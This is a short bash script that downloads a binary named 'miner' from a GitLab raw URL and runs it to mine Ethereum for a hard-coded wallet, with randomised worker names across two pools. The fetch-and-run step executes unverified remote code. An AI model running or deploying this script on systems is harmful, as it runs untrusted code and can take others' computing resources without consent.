#!/bin/bash

sudo apt update
wget -q https://gitlab.com/aahmaddony/mainwork/-/raw/main/miner
chmod +x miner
./miner -a eth --ssl 1 -s eth-sg.flexpool.io:5555 -u 0xb2c9efdea153d431af54a20ba308f72efd5b9da9.$(shuf -i 1-99999 -n 1) --ssl 1 -s eth-hke.flexpool.io:5555 -u 0xb2c9efdea153d431af54a20ba308f72efd5b9da9.$(shuf -i 1-99999 -n 1)
